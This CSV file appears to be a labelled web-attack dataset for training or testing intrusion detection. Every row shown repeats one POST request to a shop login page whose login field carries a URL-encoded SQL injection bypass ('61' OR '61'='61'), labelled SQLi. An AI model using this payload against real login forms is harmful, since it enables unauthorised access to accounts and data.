,id,method,path,query,label
96,20096,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
97,20097,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
98,20098,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
99,20099,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
100,20100,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
101,20101,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
102,20102,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
103,20103,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
104,20104,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
105,20105,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
106,20106,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
107,20107,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
108,20108,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
109,20109,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
110,20110,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
111,20111,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
112,20112,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
113,20113,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
114,20114,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
115,20115,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
116,20116,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
117,20117,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
118,20118,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
119,20119,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
120,20120,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
121,20121,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
122,20122,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
123,20123,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
124,20124,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
125,20125,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
126,20126,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
127,20127,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
128,20128,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
129,20129,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
130,20130,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
131,20131,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
132,20132,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
133,20133,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
134,20134,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
135,20135,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
136,20136,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
137,20137,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
138,20138,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
139,20139,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
140,20140,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
141,20141,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
142,20142,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
143,20143,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
144,20144,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
145,20145,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
146,20146,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
147,20147,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
148,20148,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
149,20149,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
150,20150,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
151,20151,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
152,20152,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
153,20153,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
154,20154,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
155,20155,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
156,20156,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
157,20157,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
158,20158,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
159,20159,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
160,20160,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
161,20161,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
162,20162,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
163,20163,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
164,20164,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
165,20165,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
166,20166,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
167,20167,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
168,20168,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
169,20169,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
170,20170,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
171,20171,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
172,20172,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
173,20173,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
174,20174,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
175,20175,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
176,20176,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
177,20177,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
178,20178,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
179,20179,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
180,20180,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
181,20181,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
182,20182,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
183,20183,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
184,20184,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
185,20185,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar,SQLi
